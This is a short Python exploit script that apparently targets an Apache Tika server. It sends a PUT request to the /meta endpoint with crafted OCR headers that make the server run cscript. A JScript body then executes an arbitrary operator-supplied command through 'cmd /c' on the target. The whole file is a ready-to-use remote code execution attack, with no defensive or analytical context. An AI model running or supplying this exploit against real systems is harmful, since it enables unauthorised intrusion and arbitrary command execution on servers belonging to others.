import requests

host = input("=> Target website/IP address = ")
port = input("=> Port number = ")
command = input("=> Command = ")

if len(host) == 0 or len(port) == 0 or len(command) == 0:
    print("Please enter the required parameters.")

else:
    url = host+':'+port+'/meta'

    headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", "X-Tika-OCRLanguage": "//E:Jscript", "Expect": "100-continue", "Content-type": "image/jp2", "Connection": "close"}
    
    script = '''var oShell = WScript.CreateObject("WScript.Shell");
	var oExec = oShell.Exec('cmd /c {}');'''.format(command)

    try:
        requests.put("https://"+url, headers=headers, data = script)
    
    except:
        try:
            requests.put("http://"+url, headers=headers, data = script)
        except:
            print("Unable to exploit the target")